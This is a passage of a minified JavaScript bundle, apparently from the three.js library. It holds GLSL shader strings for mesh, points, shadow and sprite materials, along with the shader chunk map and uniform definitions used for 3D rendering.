#include <lights_lambert_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_lambert_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,S1=`#define MATCAP
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <color_pars_vertex>
#include <displacementmap_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
	vViewPosition = - mvPosition.xyz;
}`,b1=`#define MATCAP
uniform vec3 diffuse;
uniform float opacity;
uniform sampler2D matcap;
varying vec3 vViewPosition;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <normal_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	vec3 viewDir = normalize( vViewPosition );
	vec3 x = normalize( vec3( viewDir.z, 0.0, - viewDir.x ) );
	vec3 y = cross( viewDir, x );
	vec2 uv = vec2( dot( x, normal ), dot( y, normal ) ) * 0.495 + 0.5;
	#ifdef USE_MATCAP
		vec4 matcapColor = texture2D( matcap, uv );
	#else
		vec4 matcapColor = vec4( vec3( mix( 0.2, 0.8, uv.y ) ), 1.0 );
	#endif
	vec3 outgoingLight = diffuseColor.rgb * matcapColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,w1=`#define NORMAL
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	varying vec3 vViewPosition;
#endif
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphinstance_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	vViewPosition = - mvPosition.xyz;
#endif
}`,E1=`#define NORMAL
uniform float opacity;
#if defined( FLAT_SHADED ) || defined( USE_BUMPMAP ) || defined( USE_NORMALMAP_TANGENTSPACE )
	varying vec3 vViewPosition;
#endif
#include <uv_pars_fragment>
#include <normal_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( 0.0, 0.0, 0.0, opacity );
	#include <clipping_planes_fragment>
	#include <logdepthbuf_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	gl_FragColor = vec4( normalize( normal ) * 0.5 + 0.5, diffuseColor.a );
	#ifdef OPAQUE
		gl_FragColor.a = 1.0;
	#endif
}`,M1=`#define PHONG
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <envmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphinstance_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <envmap_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,T1=`#define PHONG
uniform vec3 diffuse;
uniform vec3 emissive;
uniform vec3 specular;
uniform float shininess;
uniform float opacity;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_phong_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <specularmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <specularmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_phong_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;
	#include <envmap_fragment>
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,A1=`#define STANDARD
varying vec3 vViewPosition;
#ifdef USE_TRANSMISSION
	varying vec3 vWorldPosition;
#endif
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
#ifdef USE_TRANSMISSION
	vWorldPosition = worldPosition.xyz;
#endif
}`,C1=`#define STANDARD
#ifdef PHYSICAL
	#define IOR
	#define USE_SPECULAR
#endif
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float roughness;
uniform float metalness;
uniform float opacity;
#ifdef IOR
	uniform float ior;
#endif
#ifdef USE_SPECULAR
	uniform float specularIntensity;
	uniform vec3 specularColor;
	#ifdef USE_SPECULAR_COLORMAP
		uniform sampler2D specularColorMap;
	#endif
	#ifdef USE_SPECULAR_INTENSITYMAP
		uniform sampler2D specularIntensityMap;
	#endif
#endif
#ifdef USE_CLEARCOAT
	uniform float clearcoat;
	uniform float clearcoatRoughness;
#endif
#ifdef USE_DISPERSION
	uniform float dispersion;
#endif
#ifdef USE_IRIDESCENCE
	uniform float iridescence;
	uniform float iridescenceIOR;
	uniform float iridescenceThicknessMinimum;
	uniform float iridescenceThicknessMaximum;
#endif
#ifdef USE_SHEEN
	uniform vec3 sheenColor;
	uniform float sheenRoughness;
	#ifdef USE_SHEEN_COLORMAP
		uniform sampler2D sheenColorMap;
	#endif
	#ifdef USE_SHEEN_ROUGHNESSMAP
		uniform sampler2D sheenRoughnessMap;
	#endif
#endif
#ifdef USE_ANISOTROPY
	uniform vec2 anisotropyVector;
	#ifdef USE_ANISOTROPYMAP
		uniform sampler2D anisotropyMap;
	#endif
#endif
varying vec3 vViewPosition;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <iridescence_fragment>
#include <cube_uv_reflection_fragment>
#include <envmap_common_pars_fragment>
#include <envmap_physical_pars_fragment>
#include <fog_pars_fragment>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_physical_pars_fragment>
#include <transmission_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <clearcoat_pars_fragment>
#include <iridescence_pars_fragment>
#include <roughnessmap_pars_fragment>
#include <metalnessmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <roughnessmap_fragment>
	#include <metalnessmap_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <clearcoat_normal_fragment_begin>
	#include <clearcoat_normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_physical_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 totalDiffuse = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse;
	vec3 totalSpecular = reflectedLight.directSpecular + reflectedLight.indirectSpecular;
	#include <transmission_fragment>
	vec3 outgoingLight = totalDiffuse + totalSpecular + totalEmissiveRadiance;
	#ifdef USE_SHEEN
 
		outgoingLight = outgoingLight + sheenSpecularDirect + sheenSpecularIndirect;
 
 	#endif
	#ifdef USE_CLEARCOAT
		float dotNVcc = saturate( dot( geometryClearcoatNormal, geometryViewDir ) );
		vec3 Fcc = F_Schlick( material.clearcoatF0, material.clearcoatF90, dotNVcc );
		outgoingLight = outgoingLight * ( 1.0 - material.clearcoat * Fcc ) + ( clearcoatSpecularDirect + clearcoatSpecularIndirect ) * material.clearcoat;
	#endif
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,R1=`#define TOON
varying vec3 vViewPosition;
#include <common>
#include <batching_pars_vertex>
#include <uv_pars_vertex>
#include <displacementmap_pars_vertex>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <normal_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <shadowmap_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <normal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <displacementmap_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	vViewPosition = - mvPosition.xyz;
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,P1=`#define TOON
uniform vec3 diffuse;
uniform vec3 emissive;
uniform float opacity;
#include <common>
#include <dithering_pars_fragment>
#include <color_pars_fragment>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <aomap_pars_fragment>
#include <lightmap_pars_fragment>
#include <emissivemap_pars_fragment>
#include <gradientmap_pars_fragment>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <normal_pars_fragment>
#include <lights_toon_pars_fragment>
#include <shadowmap_pars_fragment>
#include <bumpmap_pars_fragment>
#include <normalmap_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	ReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );
	vec3 totalEmissiveRadiance = emissive;
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <color_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	#include <normal_fragment_begin>
	#include <normal_fragment_maps>
	#include <emissivemap_fragment>
	#include <lights_toon_fragment>
	#include <lights_fragment_begin>
	#include <lights_fragment_maps>
	#include <lights_fragment_end>
	#include <aomap_fragment>
	vec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + totalEmissiveRadiance;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
	#include <dithering_fragment>
}`,k1=`uniform float size;
uniform float scale;
#include <common>
#include <color_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
#ifdef USE_POINTS_UV
	varying vec2 vUv;
	uniform mat3 uvTransform;
#endif
void main() {
	#ifdef USE_POINTS_UV
		vUv = ( uvTransform * vec3( uv, 1 ) ).xy;
	#endif
	#include <color_vertex>
	#include <morphinstance_vertex>
	#include <morphcolor_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <project_vertex>
	gl_PointSize = size;
	#ifdef USE_SIZEATTENUATION
		bool isPerspective = isPerspectiveMatrix( projectionMatrix );
		if ( isPerspective ) gl_PointSize *= ( scale / - mvPosition.z );
	#endif
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <worldpos_vertex>
	#include <fog_vertex>
}`,L1=`uniform vec3 diffuse;
uniform float opacity;
#include <common>
#include <color_pars_fragment>
#include <map_particle_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	vec3 outgoingLight = vec3( 0.0 );
	#include <logdepthbuf_fragment>
	#include <map_particle_fragment>
	#include <color_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
	#include <premultiplied_alpha_fragment>
}`,N1=`#include <common>
#include <batching_pars_vertex>
#include <fog_pars_vertex>
#include <morphtarget_pars_vertex>
#include <skinning_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <shadowmap_pars_vertex>
void main() {
	#include <batching_vertex>
	#include <beginnormal_vertex>
	#include <morphinstance_vertex>
	#include <morphnormal_vertex>
	#include <skinbase_vertex>
	#include <skinnormal_vertex>
	#include <defaultnormal_vertex>
	#include <begin_vertex>
	#include <morphtarget_vertex>
	#include <skinning_vertex>
	#include <project_vertex>
	#include <logdepthbuf_vertex>
	#include <worldpos_vertex>
	#include <shadowmap_vertex>
	#include <fog_vertex>
}`,I1=`uniform vec3 color;
uniform float opacity;
#include <common>
#include <fog_pars_fragment>
#include <bsdfs>
#include <lights_pars_begin>
#include <logdepthbuf_pars_fragment>
#include <shadowmap_pars_fragment>
#include <shadowmask_pars_fragment>
void main() {
	#include <logdepthbuf_fragment>
	gl_FragColor = vec4( color, opacity * ( 1.0 - getShadowMask() ) );
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
}`,D1=`uniform float rotation;
uniform vec2 center;
#include <common>
#include <uv_pars_vertex>
#include <fog_pars_vertex>
#include <logdepthbuf_pars_vertex>
#include <clipping_planes_pars_vertex>
void main() {
	#include <uv_vertex>
	vec4 mvPosition = modelViewMatrix[ 3 ];
	vec2 scale = vec2( length( modelMatrix[ 0 ].xyz ), length( modelMatrix[ 1 ].xyz ) );
	#ifndef USE_SIZEATTENUATION
		bool isPerspective = isPerspectiveMatrix( projectionMatrix );
		if ( isPerspective ) scale *= - mvPosition.z;
	#endif
	vec2 alignedPosition = ( position.xy - ( center - vec2( 0.5 ) ) ) * scale;
	vec2 rotatedPosition;
	rotatedPosition.x = cos( rotation ) * alignedPosition.x - sin( rotation ) * alignedPosition.y;
	rotatedPosition.y = sin( rotation ) * alignedPosition.x + cos( rotation ) * alignedPosition.y;
	mvPosition.xy += rotatedPosition;
	gl_Position = projectionMatrix * mvPosition;
	#include <logdepthbuf_vertex>
	#include <clipping_planes_vertex>
	#include <fog_vertex>
}`,U1=`uniform vec3 diffuse;
uniform float opacity;
#include <common>
#include <uv_pars_fragment>
#include <map_pars_fragment>
#include <alphamap_pars_fragment>
#include <alphatest_pars_fragment>
#include <alphahash_pars_fragment>
#include <fog_pars_fragment>
#include <logdepthbuf_pars_fragment>
#include <clipping_planes_pars_fragment>
void main() {
	vec4 diffuseColor = vec4( diffuse, opacity );
	#include <clipping_planes_fragment>
	vec3 outgoingLight = vec3( 0.0 );
	#include <logdepthbuf_fragment>
	#include <map_fragment>
	#include <alphamap_fragment>
	#include <alphatest_fragment>
	#include <alphahash_fragment>
	outgoingLight = diffuseColor.rgb;
	#include <opaque_fragment>
	#include <tonemapping_fragment>
	#include <colorspace_fragment>
	#include <fog_fragment>
}`,Oe={alphahash_fragment:sE,alphahash_pars_fragment:rE,alphamap_fragment:aE,alphamap_pars_fragment:oE,alphatest_fragment:lE,alphatest_pars_fragment:cE,aomap_fragment:uE,aomap_pars_fragment:dE,batching_pars_vertex:pE,batching_vertex:hE,begin_vertex:fE,beginnormal_vertex:mE,bsdfs:gE,iridescence_fragment:vE,bumpmap_pars_fragment:_E,clipping_planes_fragment:xE,clipping_planes_pars_fragment:yE,clipping_planes_pars_vertex:SE,clipping_planes_vertex:bE,color_fragment:wE,color_pars_fragment:EE,color_pars_vertex:ME,color_vertex:TE,common:AE,cube_uv_reflection_fragment:CE,defaultnormal_vertex:RE,displacementmap_pars_vertex:PE,displacementmap_vertex:kE,emissivemap_fragment:LE,emissivemap_pars_fragment:NE,colorspace_fragment:IE,colorspace_pars_fragment:DE,envmap_fragment:UE,envmap_common_pars_fragment:OE,envmap_pars_fragment:FE,envmap_pars_vertex:BE,envmap_physical_pars_fragment:KE,envmap_vertex:zE,fog_vertex:VE,fog_pars_vertex:HE,fog_fragment:GE,fog_pars_fragment:WE,gradientmap_pars_fragment:jE,lightmap_pars_fragment:XE,lights_lambert_fragment:qE,lights_lambert_pars_fragment:YE,lights_pars_begin:$E,lights_toon_fragment:ZE,lights_toon_pars_fragment:JE,lights_phong_fragment:QE,lights_phong_pars_fragment:eM,lights_physical_fragment:tM,lights_physical_pars_fragment:nM,lights_fragment_begin:iM,lights_fragment_maps:sM,lights_fragment_end:rM,logdepthbuf_fragment:aM,logdepthbuf_pars_fragment:oM,logdepthbuf_pars_vertex:lM,logdepthbuf_vertex:cM,map_fragment:uM,map_pars_fragment:dM,map_particle_fragment:pM,map_particle_pars_fragment:hM,metalnessmap_fragment:fM,metalnessmap_pars_fragment:mM,morphinstance_vertex:gM,morphcolor_vertex:vM,morphnormal_vertex:_M,morphtarget_pars_vertex:xM,morphtarget_vertex:yM,normal_fragment_begin:SM,normal_fragment_maps:bM,normal_pars_fragment:wM,normal_pars_vertex:EM,normal_vertex:MM,normalmap_pars_fragment:TM,clearcoat_normal_fragment_begin:AM,clearcoat_normal_fragment_maps:CM,clearcoat_pars_fragment:RM,iridescence_pars_fragment:PM,opaque_fragment:kM,packing:LM,premultiplied_alpha_fragment:NM,project_vertex:IM,dithering_fragment:DM,dithering_pars_fragment:UM,roughnessmap_fragment:OM,roughnessmap_pars_fragment:FM,shadowmap_pars_fragment:BM,shadowmap_pars_vertex:zM,shadowmap_vertex:VM,shadowmask_pars_fragment:HM,skinbase_vertex:GM,skinning_pars_vertex:WM,skinning_vertex:jM,skinnormal_vertex:XM,specularmap_fragment:qM,specularmap_pars_fragment:YM,tonemapping_fragment:$M,tonemapping_pars_fragment:KM,transmission_fragment:ZM,transmission_pars_fragment:JM,uv_pars_fragment:QM,uv_pars_vertex:e1,uv_vertex:t1,worldpos_vertex:n1,background_vert:i1,background_frag:s1,backgroundCube_vert:r1,backgroundCube_frag:a1,cube_vert:o1,cube_frag:l1,depth_vert:c1,depth_frag:u1,distance_vert:d1,distance_frag:p1,equirect_vert:h1,equirect_frag:f1,linedashed_vert:m1,linedashed_frag:g1,meshbasic_vert:v1,meshbasic_frag:_1,meshlambert_vert:x1,meshlambert_frag:y1,meshmatcap_vert:S1,meshmatcap_frag:b1,meshnormal_vert:w1,meshnormal_frag:E1,meshphong_vert:M1,meshphong_frag:T1,meshphysical_vert:A1,meshphysical_frag:C1,meshtoon_vert:R1,meshtoon_frag:P1,points_vert:k1,points_frag:L1,shadow_vert:N1,shadow_frag:I1,sprite_vert:D1,sprite_frag:U1},pe={common:{diffuse:{value:new je(16777215)},opacity:{value:1},map:{value:null},mapTransform:{value:new Ue},alphaMap:{value:null},alphaMapTransform:{value:new Ue},alphaTest:{value:0}},specularmap:{specularMap:{value:null},specularMapTransform:{value:new Ue}},envmap:{envMap:{value:null},envMapRotation:{value:new Ue},flipEnvMap:{value:-1},reflectivity:{value:1},ior:{value:1.5},refractionRatio:{value:.98},dfgLUT:{value:null}},aomap:{aoMap:{value:null},aoMapIntensity:{value:1},aoMapTransform:{value:new Ue}},lightmap:{lightMap:{value:null},lightMapIntensity:{value:1},lightMapTransform:{value:new Ue}},bumpmap:{bumpMap:{value:null},bumpMapTransform:{value:new Ue},bumpScale:{value:1}},normalmap:{normalMap:{value:null},normalMapTransform:{value:new Ue},normalScale:{value:new Ze(1,1)}},displacementmap:{displacementMap:{value:null},displacementMapTransform:{value:new Ue},displacementScale:{value:1},displacementBias:{value:0}},emissivemap:{emissiveMap:{value:null},emissiveMapTransform:{value:new Ue}},metalnessmap:{metalnessMap:{value:null},metalnessMapTransform:{value:new Ue}},roughnessmap:{roughnessMap:{value:null},roughnessMapTransform:{value:new Ue}},gradientmap:{gradientMap:{value:null}},fog:{fogDensity:{value:25e-5},fogNear:{value:1},fogFar:{value:2e3},fogColor:{value:new je(16777215)}},lights:{ambientLightColor:{value:[]},lightProbe:{value:[]},directionalLights:{value:[],properties:{direction:{},color:{}}},directionalLightShadows:{value:[],properties:{shadowIntensity:1,shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},directionalShadowMap:{value:[]},directionalShadowMatrix:{value:[]},spotLights:{value:[],properties:{color:{},position:{},direction:{},distance:{},coneCos:{},penumbraCos:{},decay:{}}},spotLightShadows:{value:[],properties:{shadowIntensity:1,shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{}}},spotLightMap:{value:[]},spotShadowMap:{value:[]},spotLightMatrix:{value:[]},pointLights:{value:[],properties:{color:{},position:{},decay:{},distance:{}}},pointLightShadows:{value:[],properties:{shadowIntensity:1,shadowBias:{},shadowNormalBias:{},shadowRadius:{},shadowMapSize:{},shadowCameraNear:{},shadowCameraFar:{}}},pointShadowMap:{value:[]},pointShadowMatrix:{value:[]},hemisphereLights:{value:[],properties:{direction:{},skyColor:{},groundColor:{}}},rectAreaLights:{value:[],properties:{color:{},position:{},width:{},height:{}}},ltc_1:{value:null},ltc_2:{value:null}},points:{diffuse:{value:new je(16777215)},opacity:{value:1},size:{value:1},scale:{value:1},map:{value:null},alphaMap:{value:null},alphaMapTransform:{value:new Ue},alphaTest:{value:0},uvTransform:{value:new Ue}},sprite:{diffuse:{value:new je(16777215)},opacity:{value:1},center:{value:new Ze(.5,.5)},rotation:{value:0},map:{value:null},mapTransform:{value:new Ue},alphaMap:{value:null},alphaMapTransform:{value:new Ue},alphaTest:{value:0}}},ei={basic:{uniforms:Jt([pe.common,pe.specularmap,pe.envmap,pe.aomap,pe.lightmap,pe.fog]),vertexShader:Oe.meshbasic_vert,fragmentShader:Oe.meshbasic_frag},lambert:{uniforms:Jt([pe.common,pe.specularmap,pe.envmap,pe.aomap,pe.lightmap,pe.emissivemap,pe.bumpmap,pe.normalmap,pe.displacementmap,pe.fog,pe.lights,{emissive:{value:new je(0)}}]),vertexShader:Oe.meshlambert_vert,fragmentShader:Oe.meshlambert_frag},phong:{uniforms:Jt([pe.common,pe.specularmap,pe.envmap,pe.aomap,pe.lightmap,pe.emissivemap,pe.bumpmap,pe.normalmap,pe.displacementmap,pe.fog,pe.lights,{emissive:{value:new je(0)},specular:{value:new je(1118481)},shininess:{value:30}}]),vertexShader:Oe.meshphong_vert,fragmentShader:Oe.meshphong_frag},standard:{uniforms:Jt([pe.common,pe.envmap,pe.aomap,pe.lightmap,pe.emissivemap,pe.bumpmap,pe.normalmap,pe.displacementmap,pe.roughnessmap,pe.metalnessmap,pe.fog,pe.lights,{emissive:{value:new je(0)},roughness:{value:1},metalness:{value:0},envMapIntensity:{value:1}}]),vertexShader:Oe.meshphysical_vert,fragmentShader:Oe.meshphysical_frag},toon:{uniforms:Jt([pe.common,pe.aomap,pe.lightmap,pe.emissivemap,pe.bumpmap,pe.normalmap,pe.displacementmap,pe.gradientmap,pe.fog,pe.lights,{emissive:{value:new 